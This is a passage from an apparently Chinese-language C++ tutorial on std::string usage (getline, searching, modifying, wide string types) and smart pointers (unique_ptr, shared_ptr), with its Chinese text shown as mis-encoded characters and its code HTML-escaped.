åˆ†éš”ç¬¦ä¼šä»è¾“å…¥æµä¸­è¢«è¯»å–å¹¶ä¸¢å¼ƒã€‚ *å‡½æ•°åŸå‹:** 1234#include &lt;string&gt;#include &lt;istream&gt; // getline å®šä¹‰åœ¨è¿™é‡Œstd::istream&amp; getline(std::istream&amp; is, std::string&amp; str, char delim = &#x27;\\n&#x27;); 123456789101112131415161718#include &lt;string&gt;#include &lt;iostream&gt;int main() &#123; std::string line1, line2; std::cout &lt;&lt; &quot;Enter a line of text: &quot;; // æ³¨æ„ï¼šå¦‚æœä¹‹å‰æœ‰ &gt;&gt; æ“ä½œï¼Œå¯èƒ½éœ€è¦æ¸…é™¤ç¼“å†²åŒºä¸­çš„æ¢è¡Œç¬¦ // std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), &#x27;\\n&#x27;); getline(std::cin, line1); // è¯»å–æ•´è¡Œï¼Œç›´åˆ°æŒ‰ Enter std::cout &lt;&lt; &quot;Enter another line: &quot;; getline(std::cin, line2); std::cout &lt;&lt; &quot;Line 1: &quot; &lt;&lt; line1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Line 2: &quot; &lt;&lt; line2 &lt;&lt; std::endl; return 0;&#125; æ··åˆä½¿ç”¨ &gt;&gt; å’Œ getline() çš„é—®é¢˜:å½“ &gt;&gt; è¯»å–è¾“å…¥åï¼Œå®ƒä¼šå°†å¯¼è‡´è¯»å–ç»“æŸçš„ç©ºç™½å­—ç¬¦ï¼ˆé€šå¸¸æ˜¯æ¢è¡Œç¬¦ï¼‰ç•™åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ã€‚å¦‚æœç´§æ¥ç€è°ƒç”¨ getline()ï¼Œå®ƒä¼šç«‹å³è¯»åˆ°è¿™ä¸ªæ¢è¡Œç¬¦ï¼Œè®¤ä¸ºè¯»å–åˆ°ç©ºè¡Œï¼Œç„¶åç»“æŸã€‚ è§£å†³æ–¹æ³•: åœ¨ &gt;&gt; ä¹‹åã€getline() ä¹‹å‰ï¼Œæ¸…é™¤ç¼“å†²åŒºä¸­æ®‹ç•™çš„æ¢è¡Œç¬¦ã€‚å¸¸ç”¨çš„æ–¹æ³•æ˜¯ä½¿ç”¨ cin.ignore()ï¼š 123456789101112131415161718192021#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;limits&gt; // for numeric_limitsint main() &#123; int age; std::string name; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; // æ¸…é™¤ cin &gt;&gt; age åç•™ä¸‹çš„æ¢è¡Œç¬¦ std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), &#x27;\\n&#x27;); std::cout &lt;&lt; &quot;Enter your full name: &quot;; getline(std::cin, name); std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; &quot;, Name: &quot; &lt;&lt; name &lt;&lt; std::endl; return 0;&#125; 16.1.3 ä½¿ç”¨å­—ç¬¦ä¸²string ç±»æä¾›äº†ä¸°å¯Œçš„æˆå‘˜å‡½æ•°æ¥æ“ä½œå­—ç¬¦ä¸²ï¼š èµ‹å€¼: ä½¿ç”¨ operator=ã€‚ 12345std::string s1 = &quot;Initial&quot;;std::string s2;s2 = s1; // s2 å†…å®¹å˜ä¸º &quot;Initial&quot;s2 = &quot;New Value&quot;; // s2 å†…å®¹å˜ä¸º &quot;New Value&quot;s2 = &#x27;C&#x27;; // s2 å†…å®¹å˜ä¸º &quot;C&quot; æ‹¼æ¥/è¿æ¥: ä½¿ç”¨ operator+ æˆ– operator+=ã€‚å¯ä»¥ä¸ string å¯¹è±¡ã€C é£æ ¼å­—ç¬¦ä¸²æˆ–å•ä¸ªå­—ç¬¦æ‹¼æ¥ã€‚ 12345std::string first = &quot;John&quot;;std::string last = &quot;Doe&quot;;std::string full = first + &quot; &quot; + last; // full æ˜¯ &quot;John Doe&quot;first += &quot;athan&quot;; // first å˜ä¸º &quot;Johnathan&quot;full += &#x27;!&#x27;; // full å˜ä¸º &quot;John Doe!&quot; æ¯”è¾ƒ: ä½¿ç”¨å…³ç³»è¿ç®—ç¬¦ (==, !=, &lt;, &gt;, &lt;=, &gt;=)ã€‚æ¯”è¾ƒæ˜¯æŒ‰å­—å…¸é¡ºåºè¿›è¡Œçš„ã€‚ 12345678std::string str1 = &quot;Apple&quot;;std::string str2 = &quot;Banana&quot;;if (str1 &lt; str2) &#123; // true std::cout &lt;&lt; str1 &lt;&lt; &quot; comes before &quot; &lt;&lt; str2 &lt;&lt; std::endl;&#125;if (str1 == &quot;Apple&quot;) &#123; // true std::cout &lt;&lt; &quot;str1 is Apple&quot; &lt;&lt; std::endl;&#125; è·å–é•¿åº¦/å¤§å°: ä½¿ç”¨ length() æˆ– size() æ–¹æ³•ï¼ˆä¸¤è€…ç­‰ä»·ï¼‰ã€‚è¿”å›å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦æ•°ã€‚ 123std::string msg = &quot;Hello&quot;;std::cout &lt;&lt; &quot;Length: &quot; &lt;&lt; msg.length() &lt;&lt; std::endl; // è¾“å‡º 5std::cout &lt;&lt; &quot;Size: &quot; &lt;&lt; msg.size() &lt;&lt; std::endl; // è¾“å‡º 5 è®¿é—®å­—ç¬¦: operator[]: æä¾›å¿«é€Ÿè®¿é—®ï¼Œä½†ä¸è¿›è¡Œè¾¹ç•Œæ£€æŸ¥ã€‚è®¿é—®è¶Šç•Œæ˜¯æœªå®šä¹‰è¡Œä¸ºã€‚ at(): æä¾›è¾¹ç•Œæ£€æŸ¥çš„è®¿é—®ã€‚å¦‚æœç´¢å¼•è¶Šç•Œï¼Œä¼šæŠ›å‡º std::out_of_range å¼‚å¸¸ã€‚ 123456789101112std::string word = &quot;World&quot;;char first_char = word[0]; // &#x27;W&#x27;char last_char = word[word.length() - 1]; // &#x27;d&#x27;// word[5] = &#x27;!&#x27;; // å±é™©ï¼è¶Šç•Œè®¿é—®ï¼Œæœªå®šä¹‰è¡Œä¸ºtry &#123; char c = word.at(1); // &#x27;o&#x27; word.at(0) = &#x27;J&#x27;; // word å˜ä¸º &quot;Jorld&quot; c = word.at(10); // è¶Šç•Œï¼Œå°†æŠ›å‡ºå¼‚å¸¸&#125; catch (const std::out_of_range&amp; oor) &#123; std::cerr &lt;&lt; &quot;Out of Range error: &quot; &lt;&lt; oor.what() &lt;&lt; std::endl;&#125; æŸ¥æ‰¾: string æä¾›äº†å¤šç§æŸ¥æ‰¾æ–¹æ³•ï¼š find(substr, pos=0): ä»ç´¢å¼• pos å¼€å§‹æŸ¥æ‰¾å­ä¸² substr ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚ rfind(substr, pos=npos): ä»ç´¢å¼• pos å‘å‰æŸ¥æ‰¾å­ä¸² substr æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚ find_first_of(chars, pos=0): ä» pos å¼€å§‹æŸ¥æ‰¾ chars ä¸­ä»»ä½•ä¸€ä¸ªå­—ç¬¦ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚ find_last_of(chars, pos=npos): ä» pos å‘å‰æŸ¥æ‰¾ chars ä¸­ä»»ä½•ä¸€ä¸ªå­—ç¬¦æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚ find_first_not_of(chars, pos=0): ä» pos å¼€å§‹æŸ¥æ‰¾ç¬¬ä¸€ä¸ªä¸åœ¨ chars ä¸­çš„å­—ç¬¦çš„ä½ç½®ã€‚ find_last_not_of(chars, pos=npos): ä» pos å‘å‰æŸ¥æ‰¾æœ€åä¸€ä¸ªä¸åœ¨ chars ä¸­çš„å­—ç¬¦çš„ä½ç½®ã€‚ æ‰€æœ‰æŸ¥æ‰¾æ–¹æ³•å¦‚æœæ‰¾åˆ°ï¼Œè¿”å›åŒ¹é…çš„èµ·å§‹ç´¢å¼•ï¼›å¦‚æœæ‰¾ä¸åˆ°ï¼Œè¿”å› std::string::npos (ä¸€ä¸ªé™æ€æˆå‘˜å¸¸é‡ï¼Œé€šå¸¸æ˜¯ -1 æˆ–æœ€å¤§æ— ç¬¦å·æ•´æ•°å€¼)ã€‚ 1234567891011121314151617181920212223242526272829303132#include &lt;string&gt;#include &lt;iostream&gt;int main() &#123; std::string text = &quot;The quick brown fox jumps over the lazy dog.&quot;; std::string search_str = &quot;the&quot;; std::string vowels = &quot;aeiouAEIOU&quot;; size_t pos = text.find(search_str); // æŸ¥æ‰¾ &quot;the&quot; if (pos != std::string::npos) &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; search_str &lt;&lt; &quot;&#x27; found at index: &quot; &lt;&lt; pos &lt;&lt; std::endl; // è¾“å‡º 35 &#125; else &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; search_str &lt;&lt; &quot;&#x27; not found.&quot; &lt;&lt; std::endl; &#125; pos = text.find(&quot;The&quot;); // æŸ¥æ‰¾ &quot;The&quot; if (pos != std::string::npos) &#123; std::cout &lt;&lt; &quot;&#x27;The&#x27; found at index: &quot; &lt;&lt; pos &lt;&lt; std::endl; // è¾“å‡º 0 &#125; pos = text.find_first_of(vowels); // æŸ¥æ‰¾ç¬¬ä¸€ä¸ªå…ƒéŸ³ if (pos != std::string::npos) &#123; std::cout &lt;&lt; &quot;First vowel &#x27;&quot; &lt;&lt; text[pos] &lt;&lt; &quot;&#x27; found at index: &quot; &lt;&lt; pos &lt;&lt; std::endl; // è¾“å‡º &#x27;e&#x27; at 2 &#125; pos = text.find_first_not_of(&quot; &quot;); // æŸ¥æ‰¾ç¬¬ä¸€ä¸ªéç©ºæ ¼ if (pos != std::string::npos) &#123; std::cout &lt;&lt; &quot;First non-space &#x27;&quot; &lt;&lt; text[pos] &lt;&lt; &quot;&#x27; found at index: &quot; &lt;&lt; pos &lt;&lt; std::endl; // è¾“å‡º &#x27;T&#x27; at 0 &#125; return 0;&#125; ä¿®æ”¹: insert(pos, str): åœ¨ç´¢å¼• pos å¤„æ’å…¥å­—ç¬¦ä¸² strã€‚ erase(pos, count): ä»ç´¢å¼• pos å¼€å§‹åˆ é™¤ count ä¸ªå­—ç¬¦ã€‚ replace(pos, count, str): å°†ä» pos å¼€å§‹çš„ count ä¸ªå­—ç¬¦æ›¿æ¢ä¸º strã€‚ append(str): åœ¨æœ«å°¾è¿½åŠ  str (ç­‰ä»·äº +=)ã€‚ assign(str): æ›¿æ¢æ•´ä¸ªå­—ç¬¦ä¸²å†…å®¹ä¸º str (ç­‰ä»·äº =)ã€‚ 12345std::string phrase = &quot;Hello world&quot;;phrase.insert(6, &quot;beautiful &quot;); // &quot;Hello beautiful world&quot;phrase.erase(0, 6); // &quot;beautiful world&quot;phrase.replace(0, 9, &quot;Wonderful&quot;); // &quot;Wonderful world&quot;phrase.append(&quot;!&quot;); // &quot;Wonderful world!&quot; è·å– C é£æ ¼å­—ç¬¦ä¸²: c_str(): è¿”å›ä¸€ä¸ªæŒ‡å‘ä»¥ç©ºå­—ç¬¦ç»“å°¾çš„ const char* æ•°ç»„çš„æŒ‡é’ˆï¼Œå†…å®¹ä¸ string å¯¹è±¡ç›¸åŒã€‚è¿”å›çš„æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜åœ¨ string å¯¹è±¡è¢«ä¿®æ”¹æˆ–é”€æ¯åå¯èƒ½å¤±æ•ˆã€‚ data(): ç±»ä¼¼ c_str()ï¼Œä½†åœ¨ C++11 ä¹‹å‰ä¸ä¿è¯ä»¥ç©ºå­—ç¬¦ç»“å°¾ï¼ˆC++11 èµ·ä¿è¯ç»“å°¾æœ‰ \\0ï¼‰ã€‚ å½“ä½ éœ€è¦å°† string å¯¹è±¡ä¼ é€’ç»™éœ€è¦ const char* çš„ C é£æ ¼å‡½æ•°æ—¶ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•éå¸¸æœ‰ç”¨ã€‚ 12345678#include &lt;string&gt;#include &lt;cstdio&gt; // for printfint main() &#123; std::string cpp_str = &quot;C++ String&quot;; printf(&quot;Using c_str(): %s\\n&quot;, cpp_str.c_str()); return 0;&#125; 16.1.4 string è¿˜æä¾›äº†å“ªäº›åŠŸèƒ½std::string ç±»è¿˜æœ‰è®¸å¤šå…¶ä»–åŠŸèƒ½ï¼ŒåŒ…æ‹¬ï¼š å®¹é‡ç®¡ç†: capacity(): è¿”å›å½“å‰åˆ†é…çš„å†…å­˜å®¹é‡ï¼ˆå¯èƒ½å¤§äº size()ï¼‰ã€‚ reserve(n): è¯·æ±‚è‡³å°‘ä¸º n çš„å®¹é‡ã€‚å¦‚æœ n å¤§äºå½“å‰å®¹é‡ï¼Œå¯èƒ½é‡æ–°åˆ†é…å†…å­˜ã€‚ shrink_to_fit() (C++11): è¯·æ±‚å‡å°‘å®¹é‡ä»¥åŒ¹é…å½“å‰å¤§å°ã€‚ clear(): æ¸…ç©ºå­—ç¬¦ä¸²å†…å®¹ï¼ˆsize() å˜ä¸º 0ï¼‰ã€‚ empty(): æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºï¼ˆsize() == 0ï¼‰ã€‚ è¿­ä»£å™¨: æä¾› begin(), end(), rbegin(), rend() ç­‰è¿­ä»£å™¨ï¼Œå…è®¸åƒéå†å®¹å™¨ä¸€æ ·éå†å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ï¼Œå¯ä»¥é…åˆ STL ç®—æ³•ä½¿ç”¨ã€‚ å­å­—ç¬¦ä¸²: substr(pos, count): è¿”å›ä¸€ä¸ªæ–°çš„ string å¯¹è±¡ï¼ŒåŒ…å«ä» pos å¼€å§‹çš„ count ä¸ªå­—ç¬¦çš„å­ä¸²ã€‚ æ¯”è¾ƒ: compare() æ–¹æ³•æä¾›æ¯”å…³ç³»è¿ç®—ç¬¦æ›´è¯¦ç»†çš„æ¯”è¾ƒé€‰é¡¹ã€‚ æ•°å€¼è½¬æ¢ (C++11): &lt;string&gt; å¤´æ–‡ä»¶è¿˜åŒ…å« stoi, stol, stod, to_string ç­‰å‡½æ•°ï¼Œç”¨äºå­—ç¬¦ä¸²å’Œæ•°å€¼ç±»å‹ä¹‹é—´çš„è½¬æ¢ã€‚ è¦äº†è§£ string ç±»çš„æ‰€æœ‰åŠŸèƒ½ï¼Œå»ºè®®æŸ¥é˜… C++ å‚è€ƒæ–‡æ¡£ï¼ˆå¦‚ cppreference.comï¼‰ã€‚ 16.1.5 å­—ç¬¦ä¸²ç§ç±»std::string æ˜¯ std::basic_string&lt;char&gt; çš„åˆ«åï¼Œç”¨äºå¤„ç†åŸºäº char çš„çª„å­—ç¬¦å­—ç¬¦ä¸²ï¼ˆé€šå¸¸æ˜¯ ASCII æˆ– UTF-8 ç¼–ç ï¼‰ã€‚ C++ æ ‡å‡†åº“è¿˜æä¾›äº†å¤„ç†å…¶ä»–å­—ç¬¦ç±»å‹çš„ basic_string ç‰¹åŒ–ç‰ˆæœ¬ï¼š std::wstring: basic_string&lt;wchar_t&gt; çš„åˆ«åï¼Œç”¨äºå¤„ç†å®½å­—ç¬¦ (wchar_t) å­—ç¬¦ä¸²ï¼Œå¸¸ç”¨äº Windows API ä¸­çš„ Unicodeã€‚ std::u16string (C++11): basic_string&lt;char16_t&gt; çš„åˆ«åï¼Œç”¨äºå¤„ç† UTF-16 ç¼–ç çš„å­—ç¬¦ä¸²ã€‚ std::u32string (C++11): basic_string&lt;char32_t&gt; çš„åˆ«åï¼Œç”¨äºå¤„ç† UTF-32 ç¼–ç çš„å­—ç¬¦ä¸²ã€‚ è¿™äº›å®½å­—ç¬¦ä¸²ç±»å…·æœ‰ä¸ std::string ç±»ä¼¼çš„æ“ä½œæ¥å£ï¼Œä½†å¤„ç†çš„å­—ç¬¦ç±»å‹ä¸åŒã€‚ 12345678910111213141516#include &lt;string&gt;#include &lt;iostream&gt;int main() &#123; std::wstring wide_str = L&quot;Wide String Example&quot;; // L å‰ç¼€è¡¨ç¤ºå®½å­—ç¬¦å­—é¢é‡ std::u16string utf16_str = u&quot;UTF-16 String&quot;; // u å‰ç¼€ std::u32string utf32_str = U&quot;UTF-32 String&quot;; // U å‰ç¼€ // std::wcout ç”¨äºè¾“å‡ºå®½å­—ç¬¦ä¸² std::wcout &lt;&lt; L&quot;Wide: &quot; &lt;&lt; wide_str &lt;&lt; std::endl; // è¾“å‡º UTF-16/32 å­—ç¬¦ä¸²é€šå¸¸éœ€è¦ç‰¹å®šçš„åº“æˆ–è½¬æ¢ // std::cout &lt;&lt; utf16_str &lt;&lt; std::endl; // å¯èƒ½æ— æ³•æ­£ç¡®æ˜¾ç¤º return 0;&#125; é€‰æ‹©å“ªç§å­—ç¬¦ä¸²ç±»å‹å–å†³äºä½ çš„åº”ç”¨åœºæ™¯å’Œéœ€è¦å¤„ç†çš„å­—ç¬¦é›†ã€‚åœ¨ç°ä»£ C++ ä¸­ï¼Œå¦‚æœéœ€è¦å¤„ç† Unicodeï¼Œé€šå¸¸æ¨èä½¿ç”¨ UTF-8 ç¼–ç çš„ std::stringï¼Œå¹¶é…åˆç›¸åº”çš„ Unicode å¤„ç†åº“ã€‚ 16.2 æ™ºèƒ½æŒ‡é’ˆæ¨¡æ¿ç±»åœ¨ C++ ä¸­ï¼Œä½¿ç”¨ new åˆ†é…åŠ¨æ€å†…å­˜åï¼Œå¿…é¡»ä½¿ç”¨ delete æ¥é‡Šæ”¾å®ƒï¼Œå¦åˆ™ä¼šå¯¼è‡´**å†…å­˜æ³„æ¼ (Memory Leak)**ã€‚æ‰‹åŠ¨ç®¡ç†å†…å­˜å®¹æ˜“å‡ºé”™ï¼Œå°¤å…¶æ˜¯åœ¨å¤æ‚çš„ä»£ç è·¯å¾„ã€å¼‚å¸¸å¤„ç†æˆ–èµ„æºå…±äº«çš„æƒ…å†µä¸‹ã€‚å¿˜è®° deleteã€é‡å¤ delete æˆ–ä½¿ç”¨æ‚¬æŒ‚æŒ‡é’ˆï¼ˆæŒ‡å‘å·²é‡Šæ”¾å†…å­˜çš„æŒ‡é’ˆï¼‰éƒ½æ˜¯å¸¸è§çš„é”™è¯¯æ¥æºã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒC++ æ ‡å‡†åº“ï¼ˆåœ¨ &lt;memory&gt; å¤´æ–‡ä»¶ä¸­ï¼‰æä¾›äº†ä¸€ç³»åˆ—æ™ºèƒ½æŒ‡é’ˆ (Smart Pointers) æ¨¡æ¿ç±»ã€‚æ™ºèƒ½æŒ‡é’ˆæ˜¯è¡Œä¸ºç±»ä¼¼äºæŒ‡é’ˆçš„ç±»å¯¹è±¡ï¼Œä½†å®ƒä»¬èƒ½è‡ªåŠ¨ç®¡ç†æ‰€æŒ‡å‘çš„åŠ¨æ€åˆ†é…çš„å†…å­˜ã€‚å½“æ™ºèƒ½æŒ‡é’ˆæœ¬èº«ç¦»å¼€ä½œç”¨åŸŸï¼ˆä¾‹å¦‚å‡½æ•°ç»“æŸã€å¯¹è±¡é”€æ¯ï¼‰æˆ–è¢«é‡æ–°èµ‹å€¼æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨è°ƒç”¨ deleteï¼ˆæˆ–è‡ªå®šä¹‰çš„åˆ é™¤å™¨ï¼‰æ¥é‡Šæ”¾å…¶ç®¡ç†çš„å†…å­˜ã€‚è¿™æå¤§åœ°ç®€åŒ–äº†åŠ¨æ€å†…å­˜ç®¡ç†ï¼Œæé«˜äº†ç¨‹åºçš„å¥å£®æ€§ï¼Œå¹¶æœ‰åŠ©äºå®ç° RAIIï¼ˆèµ„æºè·å–å³åˆå§‹åŒ–ï¼‰ã€‚ C++11 å¼•å…¥äº†ä¸‰ç§ä¸»è¦çš„æ™ºèƒ½æŒ‡é’ˆç±»å‹ï¼š std::unique_ptr&lt;T&gt;: å®ç°ç‹¬å æ‰€æœ‰æƒ (Exclusive Ownership) æˆ–ä¸¥æ ¼æ‰€æœ‰æƒæ¨¡å‹ã€‚åœ¨ä»»ä½•æ—¶å€™ï¼Œåªæœ‰ä¸€ä¸ª unique_ptr å¯ä»¥æŒ‡å‘ç»™å®šçš„èµ„æºã€‚å½“ unique_ptr è¢«é”€æ¯æˆ–é‡ç½®æ—¶ï¼Œèµ„æºè¢«é‡Šæ”¾ã€‚å®ƒä¸èƒ½è¢«å¤åˆ¶ï¼Œä½†å¯ä»¥è¢«**ç§»åŠ¨ (Moved)**ã€‚ std::shared_ptr&lt;T&gt;: å®ç°å…±äº«æ‰€æœ‰æƒ (Shared Ownership) æ¨¡å‹ã€‚å…è®¸å¤šä¸ª shared_ptr æŒ‡å‘åŒä¸€ä¸ªèµ„æºã€‚å†…éƒ¨ç»´æŠ¤ä¸€ä¸ª**å¼•ç”¨è®¡æ•° (Reference Count)**ï¼Œè®°å½•æœ‰å¤šå°‘ä¸ª shared_ptr æŒ‡å‘è¯¥èµ„æºã€‚åªæœ‰å½“æœ€åä¸€ä¸ªæŒ‡å‘èµ„æºçš„ shared_ptr è¢«é”€æ¯æˆ–é‡ç½®æ—¶ï¼Œèµ„æºæ‰ä¼šè¢«é‡Šæ”¾ã€‚ std::weak_ptr&lt;T&gt;: æ˜¯ä¸€ç§éæ‹¥æœ‰ (Non-owning) çš„æ™ºèƒ½æŒ‡é’ˆï¼Œå®ƒæŒ‡å‘ç”± shared_ptr ç®¡ç†çš„èµ„æºï¼Œä½†ä¸å¢åŠ å¼•ç”¨è®¡æ•°ã€‚å®ƒä¸»è¦ç”¨äºè§£å†³ shared_ptr å¯èƒ½é‡åˆ°çš„å¾ªç¯å¼•ç”¨ (Cyclic Reference) é—®é¢˜ï¼Œå¹¶ç”¨äºè§‚å¯Ÿèµ„æºæ˜¯å¦å­˜åœ¨ã€‚ 16.2.1 ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆstd::unique_ptrunique_ptr æ˜¯è½»é‡çº§çš„æ™ºèƒ½æŒ‡é’ˆï¼Œå¼€é”€å‡ ä¹ä¸åŸå§‹æŒ‡é’ˆç›¸åŒã€‚å®ƒæ˜¯ç®¡ç†åŠ¨æ€åˆ†é…èµ„æºçš„é¦–é€‰æ–¹å¼ï¼Œé™¤éä½ éœ€è¦å…±äº«æ‰€æœ‰æƒã€‚ åˆ›å»º: æ¨èæ–¹å¼ (C++14 åŠä»¥å): ä½¿ç”¨ std::make_unique&lt;T&gt;(args...)ã€‚å®ƒæ›´å®‰å…¨ï¼ˆé¿å…äº†æŸäº›å¼‚å¸¸å®‰å…¨é—®é¢˜ï¼‰ä¸”å¯èƒ½æ›´é«˜æ•ˆã€‚ 12345678#include &lt;memory&gt;#include &lt;string&gt;// åˆ›å»ºæŒ‡å‘ int çš„ unique_ptrauto uptr_int = std::make_unique&lt;int&gt;(10); // æŒ‡å‘å€¼ä¸º 10 çš„ int// åˆ›å»ºæŒ‡å‘ string çš„ unique_ptrauto uptr_str = std::make_unique&lt;std::string&gt;(&quot;Hello&quot;); // æŒ‡å‘ &quot;Hello&quot; C++11 æ–¹å¼: ç›´æ¥ä½¿ç”¨ newã€‚ 12std::unique_ptr&lt;int&gt; uptr_int_cpp11(new int(20));std::unique_ptr&lt;std::string&gt; uptr_str_cpp11(new std::string(&quot;World&quot;)); æ‰€æœ‰æƒè½¬ç§» (ç§»åŠ¨): unique_ptr ä¸èƒ½å¤åˆ¶ï¼Œä½†å¯ä»¥é€šè¿‡ std::move() è½¬ç§»æ‰€æœ‰æƒã€‚ 1234567891011std::unique_ptr&lt;int&gt; ptr1 = std::make_unique&lt;int&gt;(100);// std::unique_ptr&lt;int&gt; ptr2 = ptr1; // é”™è¯¯ï¼ä¸èƒ½å¤åˆ¶std::unique_ptr&lt;int&gt; ptr3 = std::move(ptr1); // OKï¼æ‰€æœ‰æƒä» ptr1 è½¬ç§»åˆ° ptr3// æ­¤æ—¶ ptr1 å˜ä¸º nullptrif (!ptr1) &#123; std::cout &lt;&lt; &quot;ptr1 is now null.\\n&quot;;&#125;if (ptr3) &#123; std::cout &lt;&lt; &quot;ptr3 holds the value: &quot; &lt;&lt; *ptr3 &lt;&lt; std::endl; // è¾“å‡º 100&#125; å‡½æ•°å¯ä»¥è¿”å› unique_ptrï¼Œè¿™ä¼šè‡ªåŠ¨è§¦å‘ç§»åŠ¨è¯­ä¹‰ï¼Œå°†æ‰€æœ‰æƒè½¬ç§»ç»™è°ƒç”¨è€…ã€‚ 12345std::unique_ptr&lt;std::string&gt; create_string() &#123; return std::make_unique&lt;std::string&gt;(&quot;Created String&quot;);&#125;std::unique_ptr&lt;std::string&gt; owned_ptr = create_string(); // æ‰€æœ‰æƒè½¬ç§»ç»™ owned_ptr ä½¿ç”¨: åƒæ™®é€šæŒ‡é’ˆä¸€æ ·ä½¿ç”¨ * å’Œ -&gt;ã€‚ 123std::unique_ptr&lt;std::string&gt; uptr = std::make_unique&lt;std::string&gt;(&quot;Test&quot;);std::cout &lt;&lt; &quot;Value: &quot; &lt;&lt; *uptr &lt;&lt; std::endl;std::cout &lt;&lt; &quot;Length: &quot; &lt;&lt; uptr-&gt;length() &lt;&lt; std::endl; å…¶ä»–æ“ä½œ: get(): è¿”å›æŒ‡å‘è¢«ç®¡ç†å¯¹è±¡çš„åŸå§‹æŒ‡é’ˆï¼ˆä½†ä¸è½¬ç§»æ‰€æœ‰æƒï¼‰ã€‚å°å¿ƒä½¿ç”¨ï¼Œé¿å…æ‰‹åŠ¨ delete è¿™ä¸ªæŒ‡é’ˆã€‚ reset(p): é”€æ¯å½“å‰ç®¡ç†çš„å¯¹è±¡ï¼ˆå¦‚æœæœ‰ï¼‰ï¼Œå¹¶æ¥ç®¡æŒ‡é’ˆ p æŒ‡å‘çš„æ–°å¯¹è±¡ã€‚ reset(): é”€æ¯å½“å‰ç®¡ç†çš„å¯¹è±¡ï¼Œå¹¶å°† unique_ptr ç½®ä¸ºç©ºã€‚ release(): æ”¾å¼ƒå¯¹æŒ‡é’ˆçš„æ‰€æœ‰æƒï¼Œè¿”å›åŸå§‹æŒ‡é’ˆï¼Œå¹¶å°† unique_ptr ç½®ä¸ºç©ºã€‚è°ƒç”¨è€…è´Ÿè´£æ‰‹åŠ¨ delete è¿”å›çš„æŒ‡é’ˆã€‚ ç”¨äºæ•°ç»„: unique_ptr å¯ä»¥ç®¡ç†åŠ¨æ€åˆ†é…çš„æ•°ç»„ã€‚ 1234567891011// åˆ›å»ºæŒ‡å‘åŒ…å« 5 ä¸ª int çš„æ•°ç»„çš„ unique_ptrstd::unique_ptr&lt;int[]&gt; uptr_arr = std::make_unique&lt;int[]&gt;(5); // C++14// æˆ–è€… std::unique_ptr&lt;int[]&gt; uptr_arr_cpp11(new int[5]); // C++11// ä½¿ç”¨ operator[] è®¿é—®å…ƒç´ for (int i = 0; i &lt; 5; ++i) &#123; uptr_arr[i] = i * 10; std::cout &lt;&lt; uptr_arr[i] &lt;&lt; &quot; &quot;;&#125;std::cout &lt;&lt; std::endl;// ç¦»å¼€ä½œç”¨åŸŸæ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ delete[] è‡ªå®šä¹‰åˆ é™¤å™¨: å¯ä»¥ä¸º unique_ptr æŒ‡å®šè‡ªå®šä¹‰çš„åˆ é™¤å™¨ï¼Œç”¨äºæ‰§è¡Œéæ ‡å‡†çš„èµ„æºé‡Šæ”¾æ“ä½œï¼ˆå¦‚å…³é—­æ–‡ä»¶å¥æŸ„ï¼‰ã€‚ 1234567891011121314151617181920#include &lt;cstdio&gt; // for FILE, fopen, fclosestruct FileCloser &#123; void operator()(FILE* fp) const &#123; if (fp) &#123; std::fclose(fp); std::cout &lt;&lt; &quot;File closed.\\n&quot;; &#125; &#125;&#125;;int main() &#123; // ä½¿ç”¨è‡ªå®šä¹‰åˆ é™¤å™¨ FileCloser std::unique_ptr&lt;FILE, FileCloser&gt; file_ptr(std::fopen(&quot;test.txt&quot;, &quot;w&quot;)); if (file_ptr) &#123; std::fprintf(file_ptr.get(), &quot;Hello from unique_ptr with custom deleter.\\n&quot;); &#125; // å½“ file_ptr ç¦»å¼€ä½œç”¨åŸŸæ—¶ï¼ŒFileCloser::operator() ä¼šè¢«è°ƒç”¨ä»¥å…³é—­æ–‡ä»¶ return 0;&#125; std::shared_ptrshared_ptr ç”¨äºèµ„æºå¯èƒ½è¢«å¤šä¸ªæŒ‡é’ˆå…±äº«æ‰€æœ‰æƒçš„åœºæ™¯ã€‚ åˆ›å»º: æ¨èæ–¹å¼: ä½¿ç”¨ std::make_shared&lt;T&gt;(args...)ã€‚å®ƒé€šå¸¸æ›´é«˜æ•ˆï¼Œå› ä¸ºå®ƒå¯ä»¥åœ¨ä¸€æ¬¡å†…å­˜åˆ†é…ä¸­åŒæ—¶ä¸ºå¯¹è±¡å’Œå¼•ç”¨è®¡æ•°æ§åˆ¶å—åˆ†é…å†…å­˜ã€‚ 12auto sptr_int = std::make_shared&lt;int&gt;(50);auto sptr_str = std::make_shared&lt;std::string&gt;(&quot;Shared&quot;); ä½¿ç”¨ new: 12345std::shared_ptr&lt;int&gt; sptr_int_new(new int(60));// æ³¨æ„ï¼šä¸è¦å°†åŒä¸€ä¸ªåŸå§‹æŒ‡é’ˆç”¨äºåˆå§‹åŒ–å¤šä¸ª shared_ptrï¼Œåº”é€šè¿‡å¤åˆ¶å·²æœ‰çš„ shared_ptr æ¥å…±äº«// int* raw_ptr = new int(70);// std::shared_ptr&lt;int&gt; sp1(raw_ptr);// std::shared_ptr&lt;int&gt; sp2(raw_ptr); // é”™è¯¯ï¼ä¼šå¯¼è‡´é‡å¤ delete å…±äº«æ‰€æœ‰æƒå’Œå¼•ç”¨è®¡æ•°: å¤åˆ¶ shared_ptr ä¼šå¢åŠ 